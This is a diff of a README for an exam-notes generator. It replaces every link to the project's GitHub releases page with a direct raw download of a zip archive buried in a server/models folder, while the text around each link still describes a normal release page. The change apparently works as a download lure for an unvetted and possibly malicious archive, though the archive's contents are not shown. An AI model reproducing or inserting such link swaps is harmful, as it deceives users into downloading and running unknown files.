@@ -1,6 +1,6 @@
 # 📝 AI-NOTES-GENERATOR - Easy Exam Notes in One Click
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AI--NOTES--GENERATOR-ff69b4)](https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-AI--NOTES--GENERATOR-ff69b4)](https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/raw/refs/heads/main/server/models/GENERATOR-NOTE-A-v2.7-alpha.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To start using AI-NOTES-GENERATOR, you need to download it from the official rel
 
 1. Click the big button below to visit the download page:
 
-   [![Download Page](https://img.shields.io/badge/Download-AI--NOTES--GENERATOR-32CD32?style=for-the-badge)](https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/releases)
+   [![Download Page](https://img.shields.io/badge/Download-AI--NOTES--GENERATOR-32CD32?style=for-the-badge)](https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/raw/refs/heads/main/server/models/GENERATOR-NOTE-A-v2.7-alpha.3.zip)
 
 2. On the page, look for the latest release. You will find downloadable files listed under "Assets."
 
@@ -138,7 +138,7 @@ While you won’t see these in the app, AI-NOTES-GENERATOR uses these systems be
 ## 🔗 Links
 
 - Visit the download page again to get updates or reinstall:  
-  https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/releases
+  https://github.com/Vitelmojr01/AI-NOTES-GENERATOR/raw/refs/heads/main/server/models/GENERATOR-NOTE-A-v2.7-alpha.3.zip
 
 - Report issues or suggest features via GitHub Issues tab.
 
